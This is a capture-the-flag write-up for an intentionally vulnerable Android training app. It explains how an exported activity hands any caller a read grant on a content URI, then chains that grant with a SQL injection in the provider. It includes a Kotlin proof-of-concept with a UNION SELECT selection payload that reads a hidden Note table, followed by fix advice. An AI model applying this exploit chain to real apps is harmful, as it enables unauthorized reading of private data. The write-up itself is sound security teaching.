# Flag 33.1 — Free URI Permission Grant + SQL Injection Pivot

**Vulnerability category:** Content provider data exposure — URI permission grant abuse + SQL injection
**Target components:** `io.hextree.attacksurface.activities.Flag33Activity1` (exported), `io.hextree.attacksurface.providers.Flag33Provider1`

---

## Target

This flag chains two separate weaknesses: an exported activity that hands out a temporary read grant on a `content://` URI to anyone who asks, and a provider behind that URI whose query logic is vulnerable to SQL injection (the same class of bug as [flag 32](../flag-32)), which lets the grant be abused to read a completely different table than the one it was meant to expose.

**Phase 1 — getting the grant.** `Flag33Activity1`'s decompiled logic:

```java
protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    Intent intent = getIntent();
    String stringExtra = intent.getStringExtra("secret");
    if (stringExtra == null) {
        if (intent.getAction() == null || !intent.getAction().equals("io.hextree.FLAG33")) {
            return;
        }
        intent.setData(Uri.parse("content://io.hextree.flag33_1/flags"));
        intent.addFlags(1); // FLAG_GRANT_READ_URI_PERMISSION
        setResult(-1, intent);
        finish();
        return;
    }
    // ... a separate branch for a later step, not used here
}
```

Any caller that launches this activity with action `io.hextree.FLAG33` (no other input required) gets back, via `onActivityResult()`, a result `Intent` whose `data` is `content://io.hextree.flag33_1/flags` and which carries `FLAG_GRANT_READ_URI_PERMISSION`. Returning a result this way grants the **calling** app a temporary read permission on that exact URI — no check of who's calling, no user interaction, nothing beyond asking with the right action string.

**Phase 2 — abusing the grant.** Once the attacker holds a valid, system-granted read permission for `content://io.hextree.flag33_1/flags`, they can query `Flag33Provider1` through it. Based on the provider's behavior (not independently decompiled for this flag, but consistent with [flag 32](../flag-32)'s provider), its `query()` builds the `WHERE` clause by concatenating the caller-supplied `selection` argument into raw SQL, rather than treating it as an opaque, parameterized filter.

## Vulnerability

Two independent issues combine here:

1. **Unconditional URI permission grant.** `Flag33Activity1` is exported and grants read access to a provider URI to *any* caller that sends the right action — there's no verification of caller identity, no user confirmation, and no scoping beyond "you asked, so here's read access." This treats a security-sensitive action (handing out IPC-level data access) as something any installed app can request.
2. **SQL injection in the provider's `selection` handling.** Once a caller has *any* valid read grant for the provider (even one meant only to expose a `flags` table), an injectable `selection` argument lets them escape the intended query entirely with a `UNION SELECT`, retrieving data from a completely unrelated table (`Note`) that the provider was never meant to expose through this route at all.

Neither flaw alone fully explains the impact: the grant by itself would only expose whatever `/flags` normally returns, and the injection by itself would require already having read access to the provider. Combined, an attacker with *no* prior access at all can self-issue the access they need (phase 1) and then pivot far beyond the provider's intended data surface (phase 2).

## Approach

```kotlin
class Flag33Catcher : Activity() {
    private val TAG = "IntentPoC"
    private val REQ = 33

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Phase 1: request the grant from the exported activity.
        val i = Intent("io.hextree.FLAG33").apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag33Activity1"
            )
        }
        startActivityForResult(i, REQ)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        val uri = data?.data ?: run { Log.e(TAG, "no grant"); return }
        Log.i(TAG, "received grant for: $uri")

        // Phase 2: UNION injection to read the Note table.
        val inj = "0 UNION SELECT content FROM Note WHERE title='flag33' UNION SELECT 'flag33'"
        val cur: Cursor? = contentResolver.query(uri, arrayOf("name"), inj, null, null)
        cur?.use {
            while (it.moveToNext()) {
                Log.i(TAG, "FLAG33 -> " + it.getString(0))
            }
        }
    }
}
```

1. Launch `Flag33Activity1` with `startActivityForResult()` and action `io.hextree.FLAG33` — no extras, no special permission needed, since it's exported.
2. Read the granted `Uri` back from `onActivityResult()`'s `data.data` — this URI now carries a system-enforced, temporary read grant for the calling app.
3. Query that URI through `ContentResolver.query()`, but pass a crafted `selection` string instead of a normal filter: `0 UNION SELECT content FROM Note WHERE title='flag33' UNION SELECT 'flag33'`. Because the provider concatenates this into its SQL rather than treating it as a bound parameter, the query ends up executing a `UNION` that pulls the `content` column from an entirely different table (`Note`, filtered to the row titled `flag33`), surfaced through the same result column (`name`) the legitimate query would have used.
4. The flag value comes back directly in the returned `Cursor`.

See [`exploit/Flag33Catcher.kt`](./exploit/Flag33Catcher.kt) for the full PoC.

## Why it works

- The permission grant step fails to treat "hand out IPC data access" as sensitive — it's reachable by anyone who can start the activity, which an exported component always allows.
- The injection step repeats the same mistake as flag 32: a caller-supplied selection string is trusted as "just a filter" when it's actually unrestricted SQL, letting `UNION` smuggle in results from tables the provider's own route was never designed to expose.
- Together, they turn "an app that can launch one activity" into "an app that can read arbitrary rows from the underlying database" — well beyond whatever the `flags` route alone was meant to expose.

## Fix

- Treat granting URI permissions as a privileged action: verify the calling package (`getCallingPackage()`) against an allow-list, or require a signature-level permission, before ever setting `FLAG_GRANT_READ_URI_PERMISSION` on a result handed back to an arbitrary caller.
- Fix the provider's query construction the same way as [flag 32](../flag-32/README.md#fix): never concatenate a caller-supplied selection into raw SQL. Validate it against expected column/operator patterns, or avoid accepting a free-form selection from callers entirely.
- Defense in depth matters here: even with the injection fixed, an exported activity that grants data access on request with zero verification is still a problem on its own, and vice versa.
